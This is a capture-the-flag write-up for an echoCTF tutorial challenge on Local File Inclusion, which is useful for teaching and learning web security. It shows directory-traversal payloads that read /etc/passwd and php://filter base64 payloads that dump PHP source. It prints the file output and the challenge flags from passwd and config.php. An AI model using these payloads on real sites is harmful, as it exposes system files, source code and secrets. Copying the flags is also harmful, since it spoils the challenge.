echoCTF
This is a tutorial based challenge, to teach you how to exploit Local File Inlcusion (LFI) vulnerabilities.
navigate to `http://lfi-tutorial.echocity-f.com/?page=articles.php` and found page= now i will replace it
`http://lfi-tutorial.echocity-f.com/?page=../../../../../etc/passwd`

`root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false ETSCTF:x:1000:65534:ETSCTF_ETCPASSWD_FLAG_HIDDEN_HOLA:/home/ETSCTF:/bin/bash 
`

In the previous step we exploited the LFI vulnerability and read the /etc/passwd file. This time we want to include the php files and print their contents in the page, like we did in the previous step. The problem is that you can't view the PHP code with the use of include function because it executes the code.

In order to achieve that we have to find a way to encode the contents of the PHP files, this can be achieved by the use of php://filter/convert.base64-encode/resource=FILENAME. The url will now become something like `http://lfi-tutorial.echocity-f.com/?page=php://filter/convert.base64-encode/resource=/etc/passwd`

You can later decode the contents by executing this command with the encoded output returned:

enter 
`http://lfi-tutorial.echocity-f.com/?page=php://filter/convert.base64-encode/resource=/etc/passwd` then decode the base64 string
Now read the index.php using `http://lfi-tutorial.echocity-f.com/?page=php://filter/convert.base64-encode/resource=index.php`

Always include sensitive files in your tests, such as config.php, db.php, /admin/, /admin/ETSCTF.html.

There is a flag hidden in the config.php, find the flag and enter it here as an answer to complete the challenge (you need to find this flag by yourself).

`┌──(root㉿kali)-[/home/kali]
└─# code=PD9waHANCg0KJGZsYWcgPSAiRVRTQ1RGX0ZMQUdfSU5fQ09ORjE4X0ZJTEUiOw0KDQo/Pg0K  
 `                                                                                                                       
`
┌──(root㉿kali)-[/home/kali]
└─# echo $code | base64 -d
<?php

$flag = "ETSCTF_FLAG_IN_CONF18_FILE";

?>
